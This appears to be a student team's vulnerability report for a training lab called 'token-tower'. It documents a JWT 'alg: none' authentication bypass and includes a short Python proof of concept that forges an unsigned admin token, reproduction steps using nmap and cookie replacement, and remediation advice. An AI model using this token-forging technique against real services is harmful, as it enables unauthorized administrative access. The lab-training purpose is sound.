**CVE-ID**: EDU-TOKENTOWER-2026-T03-008    
**Title**: JWT Authentication Bypass via "none" Algorithm Acceptance    
**Affected Lab**: token-tower  
**Component**: JWT Authentication   
**Severity**: Critical  
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N  
**CVSS Score**: 9.1  


**Description**:  
The Token Tower application accepts JWT tokens with the `alg` header set to `"none"`, allowing attackers to forge unsigned tokens with arbitrary claims. By modifying the token header to `{"alg":"none","typ":"JWT"}` and escalating the `role` claim to `admin`, an unauthenticated attacker can bypass authentication and gain administrative privileges. This violates RFC 7518, which requires explicit rejection of unsigned tokens when a signature is expected.


**Proof of Concept**:  



Payload :
```python
#!/usr/bin/env python3
import base64, json

# Encode helper
b64 = lambda x: base64.urlsafe_b64encode(json.dumps(x).encode()).decode().rstrip('=')

# Payload with your user details
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "wise", "user_id": 67, "role": "admin"}

# Build token (NOTE the trailing dot)
token = f"{b64(header)}.{b64(payload)}."

print(token)
```

**Steps to Reproduce**:  
1. Determine deserial-gate IP by using commands `sudo docker ps` followed by `sudo docker inspect [CONTAINERID]`. Or any other method of choice.
2. Perform nmap scan on the found IP by also enabling the default scripts: `nmap -sV -sC -T5 -p- [token-towerIP]`. Output will show a http service at port 5020
3. open the website: `http:[token-towerIP]:5020/`
4. Log in with provided guest credentials
5. Open Developer Tools → Application/Storage → Cookies → Copy the JWT `token` value
6. Paste token into `https://jwt.io`, notice an algorithm header is present.
7. Generate a new JWT token with the provided payload above that sets `none` in the algorithm header.
8. Replace cookie value in your browser with forged token, refresh page
9. Observe admin dashboard load with admin access and the capture flag despite the forged token.

**Remediation**:
1. Explicitly reject tokens with `alg: none`
2. Whitelist allowed algorithms
3. Use a strong, randomly generated secret.
4. Add logging/monitoring for authentication anomalies.

**Discovered By**: Team 3  
**Date**: 2026-02-18
